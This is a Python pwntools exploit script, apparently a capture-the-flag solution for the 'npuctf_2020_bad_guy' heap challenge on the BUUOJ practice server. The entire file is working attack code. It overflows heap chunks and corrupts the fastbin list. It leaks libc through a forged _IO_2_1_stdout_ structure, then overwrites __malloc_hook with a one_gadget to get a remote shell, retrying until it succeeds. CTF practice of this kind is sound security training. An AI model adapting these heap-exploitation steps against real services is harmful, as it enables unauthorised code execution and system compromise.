from pwn import *

#context.log_level = 'debug'
context.arch = 'amd64'

#p = remote('node4.buuoj.cn', )

libc = ELF('libc-2.23.buu.so')

ru = lambda s : p.recvuntil(s)
sn = lambda s : p.send(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)
sl = lambda s : p.sendline(s)
rv = lambda s : p.recv(s)

def debug(s):
	gdb.attach(p, '''
		source ~/libc/loadsym.py
		loadsym ~/libc/2.23/64/libc-2.23.debug.so
	''' + s)
	
def alloc(index, size, content):
	sla(b'>> ', b'1')
	sla(b'Index :', str(index).encode())
	sla(b'size: ', str(size).encode())
	sa(b'Content:', content)
	
def edit(index, size, content):
	sla(b'>> ', b'2')
	sla(b'Index :', str(index).encode())
	sla(b'size: ', str(size).encode())
	sa(b'content:', content)
	
def delete(index):
	sla(b'>> ', b'3')
	sla(b'Index :', str(index).encode())

def exp():
	alloc(0, 0x10, b'a')
	alloc(1, 0x10, b'a')
	alloc(2, 0x60, b'a')
	alloc(3, 0x10, b'a')

	delete(2)

	edit(0, 0x20, b'\x00' * 0x10 + p64(0) + p64(0x91))

	delete(1)

	alloc(1, 0x10, b'a')
	edit(1, 0x22, b'a' * 0x10 + p64(0) + p64(0x71) + b'\xdd\x85')
	alloc(2, 0x60, b'a')

	#       padding	      flag     read_buf   write_buf
	layout = [
		'\x00' * 0x33, 0xfbad1800, 0, 0, 0, b'\x58'
	]
	
	alloc(3, 0x60, flat(layout))

	one_gadgets = [0x45206, 0x4525a, 0xef9f4, 0xf0897]
	one_gadgets_buu = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

	libc_base = u64(rv(8)) - libc.sym['_IO_2_1_stdout_'] - 131
	malloc_hook = libc_base + libc.sym['__malloc_hook']
	one = libc_base + one_gadgets_buu[3]
	
	success('libc_base -> {}'.format(hex(libc_base)))
	
	#uaf
	alloc(0, 0x60, b'a')
	alloc(0, 0x60, b'a')
	alloc(1, 0x60, b'a')
	alloc(2, 0x60, b'a')
	alloc(3, 0x30, b'a') #avoid merge
	
	edit(0, 0x70, b'\x00' * 0x60 + p64(0) + p64(0xe1))
	
	delete(1)
	alloc(1, 0x60, b'a')
	alloc(3, 0x60, b'a')
	delete(3)
	edit(2, 0x8, p64(malloc_hook - 0x23))
	
	alloc(0, 0x60, b'a')
	alloc(0, 0x60, b'\x00' * 0x13 + p64(one))
	
	sla(b'>> ', b'1')
	sla(b'Index :', b'0')
	sla(b'size: ', b'20')
	
	p.interactive()
	
if __name__ == "__main__":
	while True:
		try:
			#p = process('./npuctf_2020_bad_guy')
			p = remote('node4.buuoj.cn', 29604)
			exp()
			break
		except:
			p.close()
